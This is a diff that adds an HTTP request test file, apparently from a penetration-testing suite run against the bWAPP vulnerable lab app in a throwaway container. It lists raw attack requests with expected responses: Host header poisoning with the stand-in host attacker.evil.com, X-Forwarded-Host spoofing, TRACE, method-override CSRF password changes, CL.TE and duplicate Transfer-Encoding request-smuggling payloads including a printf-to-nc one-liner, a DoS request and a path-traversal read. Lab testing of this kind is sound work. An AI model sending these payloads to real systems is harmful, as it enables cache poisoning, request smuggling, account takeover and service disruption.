@@ -1,0 +1,162 @@
+### ============================================================================
+### 09 - Host header poisoning and HTTP method tampering (raw requests)
+###
+###   This file uses deliberately malformed requests, so it is kept separate
+###   from the main suites. Most editors' HTTP clients will refuse to send some
+###   of these as-is; the ones they do send are the interesting ones.
+### ============================================================================
+
+### ---------------------------------------------------------------------------
+### HOST-01  Host header poisoning - cache/link poisoning
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/hostheader_1.php HTTP/1.1
+Host: attacker.evil.com
+Cookie: {{authCookie}}
+Accept: text/html
+### Expected: 200, "attacker.evil.com" appears in every absolute URL in the page
+
+
+### ---------------------------------------------------------------------------
+### HOST-02  X-Forwarded-Host spoofing
+###   If the app trusts proxy headers it will believe this over the real Host.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/hostheader_1.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+X-Forwarded-Host: attacker.evil.com
+X-Forwarded-For: 203.0.113.9
+### Expected: 200 - if the reflected value changes, the proxy headers are trusted
+
+
+### ---------------------------------------------------------------------------
+### HOST-03  Absolute-URI request line (request smuggling / parser confusion)
+###   A proxy in front of Apache may forward the absolute URI in the Host line
+###   while Apache serves the local vhost - a classic front-end/back-end
+###   disagreement. NOT SENT BY THE RUNNER: HttpWebRequest rewrites an absolute
+###   request target to origin-form, so it cannot send this as written. Send it
+###   with a raw client to test it.
+### ---------------------------------------------------------------------------
+### SKIP
+### RUNNER-CANNOT-SEND: an absolute request target is rewritten to origin-form
+GET http://attacker.evil.com/hostheader_1.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200 - Apache serves the local vhost; a proxy in front of it may not
+
+
+### ---------------------------------------------------------------------------
+### VERB-01  TRACE - should be disabled in production
+###   TRACE echoes the request back, including cookies, which is a classic
+###   cross-site tracing attempt and a credential-leak vector.
+### ---------------------------------------------------------------------------
+TRACE {{baseUrl}}/secret.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 405 Method Not Allowed (Apache has TRACE off by default)
+
+
+### ---------------------------------------------------------------------------
+### VERB-02  Method override - PUT on a form endpoint
+###   Some frameworks honour X-HTTP-Method-Override. If bWAPP's routing trusts
+###   the verb, a state change can be triggered from a page that should only
+###   ever produce GET/POST.
+###   Observed: Apache and mod_php accept the PUT and the page renders (200), but
+###   PHP does not populate $_POST for a PUT, so csrf_1.php changes nothing. The
+###   endpoint is verb-agnostic in reach but not in effect - verify by reading
+###   the users table afterwards, not by trusting the 200.
+### ---------------------------------------------------------------------------
+PUT {{baseUrl}}/csrf_1.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+X-HTTP-Method-Override: POST
+Content-Type: application/x-www-form-urlencoded
+
+password=pwned&password_conf=pwned&form=submit
+### EXPECT-STATUS: 200|405
+### EXPECT-NOT: "The password has been changed"
+### Expected: 405, or the page renders but the change silently does nothing
+
+
+### ---------------------------------------------------------------------------
+### VERB-03  Method override header on a normal POST
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/insecure_direct_object_ref_1.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+X-HTTP-Method-Override: DELETE
+Content-Type: application/x-www-form-urlencoded
+
+login=A.I.M.&secret=verb-tampered&action=change
+### Expected: 200 - the write happens regardless of the override header,
+###           showing the endpoint's authorization is verb-agnostic
+
+
+### ---------------------------------------------------------------------------
+### SM-01  Request smuggling - CL.TE desync attempt
+###   Classic Content-Length / Transfer-Encoding disagreement. Documented as a
+###   negative result if the server answers 400.
+###   NOT SENT BY THE RUNNER: HttpWebRequest owns both headers and rewrites them,
+###   so it cannot emit a contradictory pair. Use a raw client:
+###     printf 'POST /secret.php HTTP/1.1\r\nHost: localhost:8080\r\nContent-Length: 65\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/ HTTP/1.1\r\nHost: localhost:8080\r\nX-Ignore: x\r\n\r\n' | nc localhost 8080
+### ---------------------------------------------------------------------------
+### SKIP
+### RUNNER-CANNOT-SEND: Content-Length / Transfer-Encoding are rewritten by the client
+POST {{baseUrl}}/secret.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/ HTTP/1.1
+Host: localhost:8080
+X-Ignore: x
+### Expected: 400 Bad Request - no desync, Apache 2.4 rejects the ambiguity
+
+
+### ---------------------------------------------------------------------------
+### SM-02  Double Transfer-Encoding header obfuscation
+###   Also unsendable by the runner, for the same reason as SM-01.
+### ---------------------------------------------------------------------------
+### SKIP
+### RUNNER-CANNOT-SEND: duplicate framing headers are collapsed by the client
+POST {{baseUrl}}/secret.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST /admin/ HTTP/1.1
+Content-Length: 15
+
+x=1
+0
+
+
+### Expected: 400/501 - the duplicate header is rejected, not silently merged
+
+
+### ---------------------------------------------------------------------------
+### DOS-01  Resource-exhaustion surface (bWAPP "DoS" bugs)
+###   Only send this against the throwaway Docker container. It is here so the
+###   report can state the vector exists, not to run it repeatedly.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/sm_dos_1.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200 - resource consumption bug; do not repeat
+
+
+### ---------------------------------------------------------------------------
+### DOS-02  DoS via the included-file bug (LFI to a huge file)
+###   Combines LFI-01 with resource use: read a large file to burn worker time.
+###   Point `page` at /dev/zero only on a disposable container.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/directory_traversal_1.php?page=/var/www/html/documents/bWAPP_intro.pdf HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, a 5 MB PDF read line-by-line and echoed - worker tied up
